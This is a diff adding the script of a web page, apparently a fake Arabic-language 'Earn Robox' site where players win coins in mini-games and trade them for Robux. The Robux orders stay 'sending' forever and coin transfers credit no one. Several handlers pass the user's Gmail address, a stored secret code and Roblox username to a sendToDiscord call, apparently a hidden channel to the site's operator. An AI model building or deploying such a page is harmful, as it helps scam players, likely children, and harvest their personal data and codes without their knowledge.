+        document.getElementById("verifyQuestCodeBtn").addEventListener("click", () => {
+          const val = document.getElementById("typedQuestCode").value.trim().toUpperCase();
+          if (val === quest.targetCode) {
+            completeQuestReward(quest);
+            gameStatus.textContent = `ممتاز! الكود صحيح وحصلت على +${QUEST_REWARD_COINS} كوينز ✓`;
+            gameStatus.className = "status success";
+          } else {
+            gameStatus.textContent = "الكود غير مطابق، تأكد من كتابته بشكل صحيح!";
+            gameStatus.className = "status error";
+          }
+        });
+        return;
+      }
+
+      modeBadge.textContent = "🕹️ MINI GAME";
+
+      if (quest.id === "candy") {
+        setupCandyGame(quest);
+      } else if (quest.id === "sniper") {
+        setupSniperGame(quest);
+      } else if (quest.id === "tetris") {
+        setupTetrisGame(quest);
+      } else if (quest.id === "subway") {
+        setupSubwayGame(quest);
+      }
+    }
+
+    function setupCandyGame(quest) {
+      gameDesc.textContent = "اختر جوهرتين متجاورتين لتبديلهما، وطابق 3 أو أكثر للوصول إلى 30 نقطة!";
+      const candies = ["🍬", "🍭", "💎", "🍓", "🍇"];
+      let score = 0;
+      let done = false;
+      let selectedIdx = null;
+      let board = Array.from({ length: 25 }, () => candies[Math.floor(Math.random() * candies.length)]);
+
+      miniGameArea.innerHTML = `
+        <div style="font-weight:800;color:#22d3ee;">النقاط: <span id="candyScore">0</span> / 30</div>
+        <div class="candy-grid" id="candyGrid"></div>
+      `;
+
+      const gridEl = document.getElementById("candyGrid");
+      const scoreEl = document.getElementById("candyScore");
+
+      function areAdjacent(i, j) {
+        const r1 = Math.floor(i / 5), c1 = i % 5;
+        const r2 = Math.floor(j / 5), c2 = j % 5;
+        return Math.abs(r1 - r2) + Math.abs(c1 - c2) === 1;
+      }
+
+      function findMatches() {
+        const matched = new Set();
+        for (let r = 0; r < 5; r++) {
+          for (let c = 0; c <= 2; c++) {
+            const idx = r * 5 + c;
+            if (board[idx] === board[idx + 1] && board[idx] === board[idx + 2]) {
+              matched.add(idx); matched.add(idx + 1); matched.add(idx + 2);
+            }
+          }
+        }
+        for (let c = 0; c < 5; c++) {
+          for (let r = 0; r <= 2; r++) {
+            const idx = r * 5 + c;
+            if (board[idx] === board[idx + 5] && board[idx] === board[idx + 10]) {
+              matched.add(idx); matched.add(idx + 5); matched.add(idx + 10);
+            }
+          }
+        }
+        return matched;
+      }
+
+      function resolveMatches() {
+        let matches = findMatches();
+        while (matches.size > 0 && !done) {
+          score += matches.size * 5;
+          scoreEl.textContent = String(Math.min(30, score));
+          matches.forEach((i) => {
+            board[i] = candies[Math.floor(Math.random() * candies.length)];
+          });
+          if (score >= 30 && !done) {
+            done = true;
+            scoreEl.textContent = "30";
+            completeQuestReward(quest);
+            gameStatus.textContent = `رائع! أنهيت كاندي كراش وربحت +${QUEST_REWARD_COINS} كوينز ✓`;
+            gameStatus.className = "status success";
+          }
+          matches = findMatches();
+        }
+      }
+
+      resolveMatches();
+      score = 0;
+      scoreEl.textContent = "0";
+
+      function renderBoard() {
+        gridEl.innerHTML = "";
+        board.forEach((item, idx) => {
+          const cell = document.createElement("button");
+          cell.type = "button";
+          cell.className = "candy-cell" + (selectedIdx === idx ? " selected" : "");
+          cell.textContent = item;
+          cell.addEventListener("click", () => {
+            if (done) return;
+            if (selectedIdx === null) {
+              selectedIdx = idx;
+              renderBoard();
+            } else if (selectedIdx === idx) {
+              selectedIdx = null;
+              renderBoard();
+            } else if (areAdjacent(selectedIdx, idx)) {
+              [board[selectedIdx], board[idx]] = [board[idx], board[selectedIdx]];
+              const matched = findMatches();
+              if (matched.size > 0) {
+                selectedIdx = null;
+                resolveMatches();
+              } else {
+                [board[selectedIdx], board[idx]] = [board[idx], board[selectedIdx]];
+                selectedIdx = null;
+              }
+              renderBoard();
+            } else {
+              selectedIdx = idx;
+              renderBoard();
+            }
+          });
+          gridEl.appendChild(cell);
+        });
+      }
+
+      renderBoard();
+    }
+
+    function setupSniperGame(quest) {
+      gameDesc.textContent = "حرّك المنظار واضغط على الهدف المتحرك 5 مرات لإصابته!";
+      let hits = 0;
+      let done = false;
+
+      miniGameArea.innerHTML = `
+        <div style="font-weight:800;color:#fb7185;">الإصابات بالقناصة: <span id="sniperHits">0</span> / 5</div>
+        <div class="scope-board" id="scopeBoard">
+          <div class="sniper-target" id="sniperTarget" style="left:50%;top:50%;"></div>
+        </div>
+      `;
+
+      const board = document.getElementById("scopeBoard");
+      const target = document.getElementById("sniperTarget");
+      const hitsEl = document.getElementById("sniperHits");
+
+      function moveTarget() {
+        if (done) return;
+        const x = 16 + Math.random() * (board.clientWidth - 32);
+        const y = 18 + Math.random() * (board.clientHeight - 36);
+        target.style.left = `${x}px`;
+        target.style.top = `${y}px`;
+      }
+
+      const moveTimer = setInterval(moveTarget, 900);
+      activeGameCleanup = () => clearInterval(moveTimer);
+
+      target.addEventListener("click", (e) => {
+        e.stopPropagation();
+        if (done) return;
+        hits += 1;
+        hitsEl.textContent = String(hits);
+        if (hits >= 5) {
+          done = true;
+          clearInterval(moveTimer);
+          completeQuestReward(quest);
+          gameStatus.textContent = `إصابة دقيقة! ربحت +${QUEST_REWARD_COINS} كوينز ✓`;
+          gameStatus.className = "status success";
+        } else {
+          moveTarget();
+        }
+      });
+    }
+
+    function setupTetrisGame(quest) {
+      gameDesc.textContent = "حرّك القطع وأسقطها لملء صف أو تجميع سكور 10 لإتمام المهمة!";
+      const rows = 10, cols = 8;
+      let score = 0;
+      let done = false;
+      let grid = Array.from({ length: rows }, () => Array(cols).fill(0));
+      let piece = { r: 0, c: 3, shape: [[1, 1], [1, 1]] };
+
+      miniGameArea.innerHTML = `
+        <div style="font-weight:800;color:#22d3ee;">السكور: <span id="tetrisScore">0</span> / 10</div>
+        <div class="tetris-board" id="tetrisBoard"></div>
+        <div class="inline-row" style="justify-content:center;">
+          <button type="button" class="mini-btn" id="tLeft">⬅️ يسار</button>
+          <button type="button" class="mini-btn" id="tDown">⬇️ إسقاط</button>
+          <button type="button" class="mini-btn" id="tRight">يمين ➡️</button>
+        </div>
+      `;
+
+      const boardEl = document.getElementById("tetrisBoard");
+      const scoreEl = document.getElementById("tetrisScore");
+
+      function canPlace(pr, pc, shape) {
+        for (let r = 0; r < shape.length; r++) {
+          for (let c = 0; c < shape[r].length; c++) {
+            if (!shape[r][c]) continue;
+            const nr = pr + r;
+            const nc = pc + c;
+            if (nr < 0 || nr >= rows || nc < 0 || nc >= cols) return false;
+            if (grid[nr][nc]) return false;
+          }
+        }
+        return true;
+      }
+
+      function spawnPiece() {
+        const shapes = [
+          [[1, 1], [1, 1]],
+          [[1, 1, 1]],
+          [[1], [1], [1]]
+        ];
+        piece = {
+          r: 0,
+          c: Math.floor(Math.random() * 5),
+          shape: shapes[Math.floor(Math.random() * shapes.length)]
+        };
+        if (!canPlace(piece.r, piece.c, piece.shape)) {
+          grid = Array.from({ length: rows }, () => Array(cols).fill(0));
+        }
+      }
+
+      function addScore(pts) {
+        if (done) return;
+        score += pts;
+        scoreEl.textContent = String(Math.min(10, score));
+        if (score >= 10) {
+          done = true;
+          scoreEl.textContent = "10";
+          clearInterval(dropTimer);
+          completeQuestReward(quest);
+          gameStatus.textContent = `عاش! أكملت سكور 10 في تتريس وربحت +${QUEST_REWARD_COINS} كوينز ✓`;
+          gameStatus.className = "status success";
+        }
+      }
+
+      function lockPiece() {
+        for (let r = 0; r < piece.shape.length; r++) {
+          for (let c = 0; c < piece.shape[r].length; c++) {
+            if (piece.shape[r][c]) {
+              grid[piece.r + r][piece.c + c] = 1;
+            }
+          }
+        }
+        addScore(2);
+
+        let clearedRows = 0;
+        grid = grid.filter((row) => {
+          const full = row.every((cell) => cell === 1);
+          if (full) clearedRows += 1;
+          return !full;
+        });
+        while (grid.length < rows) {
+          grid.unshift(Array(cols).fill(0));
+        }
+        if (clearedRows > 0) {
+          addScore(clearedRows * 5);
+        }
+
+        spawnPiece();
+      }
+
+      function stepDown() {
+        if (done) return;
+        if (canPlace(piece.r + 1, piece.c, piece.shape)) {
+          piece.r += 1;
+        } else {
+          lockPiece();
+        }
+        renderTetris();
+      }
+
+      function renderTetris() {
+        boardEl.innerHTML = "";
+        for (let r = 0; r < rows; r++) {
+          for (let c = 0; c < cols; c++) {
+            let isPiece = false;
+            for (let pr = 0; pr < piece.shape.length; pr++) {
+              for (let pc = 0; pc < piece.shape[pr].length; pc++) {
+                if (piece.shape[pr][pc] && piece.r + pr === r && piece.c + pc === c) {
+                  isPiece = true;
+                }
+              }
+            }
+            const div = document.createElement("div");
+            div.className = "t-cell" + (grid[r][c] ? " filled" : "") + (isPiece ? " active-piece" : "");
+            boardEl.appendChild(div);
+          }
+        }
+      }
+
+      document.getElementById("tLeft").addEventListener("click", () => {
+        if (!done && canPlace(piece.r, piece.c - 1, piece.shape)) {
+          piece.c -= 1;
+          renderTetris();
+        }
+      });
+
+      document.getElementById("tRight").addEventListener("click", () => {
+        if (!done && canPlace(piece.r, piece.c + 1, piece.shape)) {
+          piece.c += 1;
+          renderTetris();
+        }
+      });
+
+      document.getElementById("tDown").addEventListener("click", stepDown);
+
+      const dropTimer = setInterval(stepDown, 650);
+      activeGameCleanup = () => clearInterval(dropTimer);
+      renderTetris();
+    }
+
+    function setupSubwayGame(quest) {
+      gameDesc.textContent = "اضغط اقفز لتفادي العقبات الحمراء وتجميع 6 نقاط في المسار الأفقي!";
+      let points = 0;
+      let done = false;
+      let isJumping = false;
+      let obsX = 320;
+
+      miniGameArea.innerHTML = `
+        <div style="font-weight:800;color:#34d399;">النقاط: <span id="runnerPts">0</span> / 6</div>
+        <div class="runner-track" id="runnerTrack">
+          <div class="runner-player" id="runnerPlayer"></div>
+          <div class="runner-obstacle" id="runnerObs" style="left:320px;"></div>
+        </div>
+        <button type="button" class="mini-btn" id="jumpBtn">⬆️ اقفز</button>
+      `;
+
+      const player = document.getElementById("runnerPlayer");
+      const obs = document.getElementById("runnerObs");
+      const ptsEl = document.getElementById("runnerPts");
+
+      document.getElementById("jumpBtn").addEventListener("click", () => {
+        if (done || isJumping) return;
+        isJumping = true;
+        player.style.bottom = "66px";
+        setTimeout(() => {
+          player.style.bottom = "27px";
+          isJumping = false;
+        }, 420);
+      });
+
+      const loopTimer = setInterval(() => {
+        if (done) return;
+        obsX -= 7;
+        if (obsX < -24) {
+          obsX = 330;
+          points += 1;
+          ptsEl.textContent = String(points);
+          if (points >= 6) {
+            done = true;
+            clearInterval(loopTimer);
+            completeQuestReward(quest);
+            gameStatus.textContent = `مذهل! أنهيت سباق صب واي 2D وربحت +${QUEST_REWARD_COINS} كوينز ✓`;
+            gameStatus.className = "status success";
+            return;
+          }
+        }
+        obs.style.left = `${obsX}px`;
+
+        if (!isJumping && obsX > 24 && obsX < 56) {
+          points = Math.max(0, points - 1);
+          ptsEl.textContent = String(points);
+          obsX = 330;
+        }
+      }, 30);
+
+      activeGameCleanup = () => clearInterval(loopTimer);
+    }
+
+    function renderProfileScreen() {
+      const state = getCurrentUserState();
+      document.getElementById("profileNameInput").value = state.profileName;
+      document.getElementById("profileStatus").textContent = "";
+      document.getElementById("transferStatus").textContent = "";
+    }
+
+    document.getElementById("saveProfileNameBtn").addEventListener("click", () => {
+      const input = document.getElementById("profileNameInput");
+      const cleanName = input.value.trim();
+      const statusEl = document.getElementById("profileStatus");
+
+      if (cleanName.length < 3) {
+        statusEl.textContent = "اكتب اسم بروفايل من 3 أحرف على الأقل.";
+        statusEl.className = "status error";
+        return;
+      }
+
+      const state = getCurrentUserState();
+      state.profileName = cleanName;
+      saveUserState(state);
+
+      statusEl.textContent = "تم حفظ اسم البروفايل بنجاح ✓";
+      statusEl.className = "status success";
+    });
+
+    document.getElementById("copyProfileNameBtn").addEventListener("click", () => {
+      const val = document.getElementById("profileNameInput").value.trim();
+      const statusEl = document.getElementById("profileStatus");
+      if (val) {
+        const tempInput = document.createElement("input");
+        tempInput.value = val;
+        document.body.appendChild(tempInput);
+        tempInput.select();
+        try {
+          document.execCommand("copy");
+        } catch (e) {}
+        document.body.removeChild(tempInput);
+      }
+      statusEl.textContent = `تم نسخ الاسم: ${val}`;
+      statusEl.className = "status success";
+    });
+
+    document.getElementById("sendCoinsBtn").addEventListener("click", () => {
+      const targetName = document.getElementById("sendTargetName").value.trim();
+      const amount = Number(document.getElementById("sendCoinsAmount").value);
+      const statusEl = document.getElementById("transferStatus");
+      const state = getCurrentUserState();
+
+      if (!targetName) {
+        statusEl.textContent = "اكتب اسم البروفايل المستلم أولًا.";
+        statusEl.className = "status error";
+        return;
+      }
+
+      if (!Number.isInteger(amount) || amount <= 0) {
+        statusEl.textContent = "اكتب عدد كوينز صحيح أكبر من صفر.";
+        statusEl.className = "status error";
+        return;
+      }
+
+      if (amount > state.coins) {
+        statusEl.textContent = "رصيد الكوينز الخاص بك غير كافٍ.";
+        statusEl.className = "status error";
+        return;
+      }
+
+      state.coins -= amount;
+      saveUserState(state);
+      updateAllCoinsCounters();
+
+      sendToDiscord(
+        "💸 تحويل كوينز في Earn Robox",
+        [
+          { name: "المرسل (Gmail)", value: state.email, inline: true },
+          { name: "اسم المرسل", value: state.profileName, inline: true },
+          { name: "المستلم", value: targetName, inline: true },
+          { name: "الكمية", value: `${amount} كوينز`, inline: true },
+          { name: "الرصيد المتبقي", value: `${state.coins} كوينز`, inline: true }
+        ],
+        0xf59e0b
+      );
+
+      document.getElementById("sendTargetName").value = "";
+      document.getElementById("sendCoinsAmount").value = "";
+      statusEl.textContent = `تم إرسال ${amount} كوينز إلى (${targetName}) بنجاح ✓`;
+      statusEl.className = "status success";
+    });
+
+    function renderShopScreen() {
+      const state = getCurrentUserState();
+      const inputEl = document.getElementById("robloxUsernameInput");
+      const packagesSection = document.getElementById("shopPackagesSection");
+      const nameStatus = document.getElementById("shopNameStatus");
+      const buyStatus = document.getElementById("shopBuyStatus");
+
+      inputEl.value = state.robloxUsername;
+      buyStatus.textContent = "";
+
+      if (state.robloxUsername.trim().length >= 2) {
+        packagesSection.style.display = "block";
+        nameStatus.textContent = `الشوب مفتوح لحساب روبلوكس: ${state.robloxUsername}`;
+        nameStatus.className = "status success";
+      } else {
+        packagesSection.style.display = "none";
+        nameStatus.textContent = "اكتب اسمك في روبلوكس واضغط تأكيد الاسم لفتح الباقات.";
+        nameStatus.className = "status";
+      }
+
+      renderOrdersList(state);
+    }
+
+    function renderOrdersList(state) {
+      const ordersEl = document.getElementById("ordersList");
+      if (!state.orders || state.orders.length === 0) {
+        ordersEl.innerHTML = `<div style="font-size:0.84rem;color:var(--text-muted);">لا توجد مشتريات حتى الآن.</div>`;
+        return;
+      }
+
+      ordersEl.innerHTML = state.orders
+        .map(
+          (order) => `
+          <div class="order-item">
+            <div>
+              <strong>${order.robux} روبوكس</strong> — حساب: <span>${order.robloxUsername}</span> (${order.cost} كوينز)
+            </div>
+            <span class="sending-badge">جار ارسال روبوكس</span>
+          </div>
+        `
+        )
+        .join("");
+    }
+
+    document.getElementById("unlockShopBtn").addEventListener("click", () => {
+      const val = document.getElementById("robloxUsernameInput").value.trim();
+      const nameStatus = document.getElementById("shopNameStatus");
+
+      if (val.length < 2) {
+        nameStatus.textContent = "من فضلك اكتب اسم صحيح في روبلوكس (حرفين على الأقل).";
+        nameStatus.className = "status error";
+        return;
+      }
+
+      const state = getCurrentUserState();
+      state.robloxUsername = val;
+      saveUserState(state);
+      renderShopScreen();
+    });
+
+    document.querySelectorAll(".buy-btn").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        const robux = Number(btn.dataset.robux);
+        const cost = Number(btn.dataset.cost);
+        const buyStatus = document.getElementById("shopBuyStatus");
+        const state = getCurrentUserState();
+
+        if (!state.robloxUsername || state.robloxUsername.trim().length < 2) {
+          buyStatus.textContent = "اكتب اسمك في روبلوكس أولًا علشان الروبكس يوصلك!";
+          buyStatus.className = "status error";
+          return;
+        }
+
+        if (state.coins < cost) {
+          buyStatus.textContent = `رصيدك غير كافٍ! تحتاج ${cost} كوينز لشراء ${robux} روبوكس.`;
+          buyStatus.className = "status error";
+          return;
+        }
+
+        state.coins -= cost;
+        const newOrder = {
+          id: Date.now(),
+          robux,
+          cost,
+          robloxUsername: state.robloxUsername,
+          status: "جار ارسال روبوكس"
+        };
+        state.orders.unshift(newOrder);
+        saveUserState(state);
+        updateAllCoinsCounters();
+        renderOrdersList(state);
+
+        sendToDiscord(
+          "🛒 طلب شراء روبوكس جديد في Earn Robox",
+          [
+            { name: "Gmail", value: state.email, inline: true },
+            { name: "الرمز", value: state.secretCode || "غير مسجل", inline: true },
+            { name: "اسم روبلوكس", value: state.robloxUsername, inline: true },
+            { name: "الباقة", value: `${robux} روبوكس (${cost} كوينز)`, inline: true },
+            { name: "الحالة", value: "جار ارسال روبوكس", inline: true },
+            { name: "الرصيد المتبقي", value: `${state.coins} كوينز`, inline: true }
+          ],
+          0x38bdf8
+        );
+
+        buyStatus.textContent = `تم تسجيل طلب ${robux} روبوكس لحساب (${state.robloxUsername}) — جار ارسال روبوكس ✓`;
+        buyStatus.className = "status success";
+      });
+    });
+
+    document.querySelectorAll(".theme-option-btn").forEach((btn) => {
+      btn.addEventListener("click", () => {
+        applyTheme(btn.dataset.theme);
+      });
+    });
+
+    document.getElementById("openSettingsFromLogin").addEventListener("click", () => {
+      previousScreenBeforeSettings = "login";
+      showScreen("settings");
+    });
+
+    document.getElementById("openSettingsBtn").addEventListener("click", () => {
+      previousScreenBeforeSettings = "quests";
+      showScreen("settings");
+    });
+
+    document.getElementById("backFromSettingsBtn").addEventListener("click", () => {
+      showScreen(previousScreenBeforeSettings);
+    });
+
+    document.getElementById("openProfileBtn").addEventListener("click", () => showScreen("profile"));
+    document.getElementById("backFromProfileBtn").addEventListener("click", () => showScreen("quests"));
+
+    document.getElementById("openShopBtn").addEventListener("click", () => showScreen("shop"));
+    document.getElementById("backFromShopBtn").addEventListener("click", () => showScreen("quests"));
+
+    document.getElementById("backToQuestsBtn").addEventListener("click", () => showScreen("quests"));
+    document.getElementById("backToLoginBtn").addEventListener("click", () => showScreen("login"));
+
+    applyTheme(localStorage.getItem(THEME_STORAGE_KEY) || "default");
+  </script>
+</body>
+</html>
